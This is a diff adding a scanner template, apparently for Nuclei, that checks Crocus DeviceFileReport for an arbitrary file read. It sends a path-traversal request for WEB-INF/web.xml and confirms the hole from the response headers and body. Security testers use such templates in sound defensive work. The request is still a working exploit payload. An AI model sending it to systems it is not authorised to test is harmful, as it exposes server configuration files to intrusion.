@@ -1,0 +1,28 @@
+id: crocus-devicefilereport-file-read
+info:
+  name: Crocus DeviceFileReport Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/DeviceFileReport.do?Action=Download&FilePath=/../WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "web-app"
+          - "<display-name><"
+        part: body
+      - type: word
+        words:
+          - "filename=web.xml"
+        part: header
+      - type: word
+        words:
+          - "application/octet-stream"
+        part: header
